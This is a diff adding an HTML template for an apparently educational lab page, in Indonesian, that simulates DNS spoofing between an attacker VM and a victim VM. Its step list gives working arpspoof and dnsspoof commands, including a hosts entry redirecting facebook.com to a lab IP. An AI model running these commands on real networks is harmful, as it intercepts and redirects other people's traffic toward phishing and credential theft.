@@ -1,0 +1,121 @@
+{% include "layout/header.html" %}
+
+<h1 class="title">DNS Spoofing Simulation</h1>
+<p class="subtitle">Simulasi serangan DNS Spoofing menggunakan 2 VM.</p>
+
+<div class="lab-layout">
+
+    <!-- SIDEBAR -->
+    <aside class="lab-sidebar">
+        <h4>Step by Step</h4>
+
+        <div class="steps-container">
+
+            <div class="step-item">
+                <button class="step-title" onclick="toggleStep('step1')">
+                    Step 1 — Start VM
+                </button>
+                <div id="step1" class="step-content">
+                    <p>Nyalakan VM Attacker dan Victim dalam satu jaringan.</p>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <button class="step-title" onclick="toggleStep('step2')">
+                    Step 2 — Network Check
+                </button>
+                <div id="step2" class="step-content">
+                    <pre><code>ip a</code></pre>
+                    <pre><code>ping victim_ip</code></pre>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <button class="step-title" onclick="toggleStep('step3')">
+                    Step 3 — Enable IP Forward
+                </button>
+                <div id="step3" class="step-content">
+                    <pre><code>echo 1 > /proc/sys/net/ipv4/ip_forward</code></pre>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <button class="step-title" onclick="toggleStep('step4')">
+                    Step 4 — ARP Spoofing
+                </button>
+                <div id="step4" class="step-content">
+                    <pre><code>
+arpspoof -i eth0 -t victim_ip gateway_ip
+arpspoof -i eth0 -t gateway_ip victim_ip
+                    </code></pre>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <button class="step-title" onclick="toggleStep('step5')">
+                    Step 5 — DNS Spoofing
+                </button>
+                <div id="step5" class="step-content">
+                    <pre><code>
+echo \"facebook.com 192.168.56.100\" > dns.txt
+dnsspoof -i eth0 -f dns.txt
+                    </code></pre>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <button class="step-title" onclick="toggleStep('step6')">
+                    Step 6 — Result
+                </button>
+                <div id="step6" class="step-content">
+                    <p>Victim akan diarahkan ke IP palsu saat membuka domain target.</p>
+                </div>
+            </div>
+
+        </div>
+    </aside>
+
+    <!-- MAIN CONTENT -->
+    <main class="lab-content">
+        <h2>Virtual Machine Preview</h2>
+
+
+        <div class="vm-grid">
+
+            <!-- Attacker Box -->
+            <div class="vm-card">
+                <h3>Attacker VM</h3>
+                <div class="vm-preview placeholder">
+                    <span>Preview Attacker VM (Desain)</span>
+                </div>
+                <div class="controls">
+                    <button class="btn primary">Start</button>
+                    <button class="btn">Reset</button>
+                    <span class="status">Status: offline</span>
+                </div>
+            </div>
+
+            <!-- Target Box -->
+            <div class="vm-card">
+                <h3>Alamat Target</h3>
+                <div class="vm-preview placeholder">
+                    <span>ini adalah alamat ip target</span>
+                </div>
+                <div class="controls">
+                    <button class="btn primary">Start</button>
+                    <button class="btn">Reset</button>
+                    <span class="status">Status: offline</span>
+            </div>
+
+        </div>
+    </main>
+
+
+<script>
+function toggleStep(id) {
+    const el = document.getElementById(id);
+    el.style.display = el.style.display === 'block' ? 'none' : 'block';
+}
+</script>
+
+{% include "layout/footer.html" %}
